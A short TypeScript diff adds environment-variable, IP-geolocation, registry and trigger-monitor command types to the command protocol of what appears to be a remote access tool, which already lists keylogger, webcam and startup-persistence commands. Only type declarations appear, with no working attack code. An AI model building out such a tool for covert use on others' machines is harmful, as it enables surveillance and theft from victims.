@@ -19,6 +19,10 @@ import type { TaskManagerCommandPayload } from "./task-manager";
 import type { StartupCommandPayload } from "./startup-manager";
 import type { KeyloggerCommandPayload } from "./keylogger";
 import type { SystemInfoCommandPayload, SystemInfoSnapshot } from "./system-info";
+import type { EnvironmentCommandPayload } from "./environment";
+import type { GeoCommandPayload } from "./ip-geolocation";
+import type { RegistryCommandPayload } from "./registry";
+import type { TriggerMonitorCommandPayload } from "./trigger-monitor";
 
 export type CommandName =
   | "ping"
@@ -39,7 +43,11 @@ export type CommandName =
   | "task-manager"
   | "keylogger.start"
   | "keylogger.stop"
-  | "startup-manager";
+  | "startup-manager"
+  | "environment-variables"
+  | "ip-geolocation"
+  | "registry"
+  | "trigger-monitor";
 
 export interface PingCommandPayload {
   message?: string;
@@ -100,7 +108,11 @@ export type CommandPayload =
   | WebcamCommandPayload
   | TaskManagerCommandPayload
   | KeyloggerCommandPayload
-  | StartupCommandPayload;
+  | StartupCommandPayload
+  | EnvironmentCommandPayload
+  | GeoCommandPayload
+  | RegistryCommandPayload
+  | TriggerMonitorCommandPayload;
 
 export interface CommandInput {
   name: CommandName;
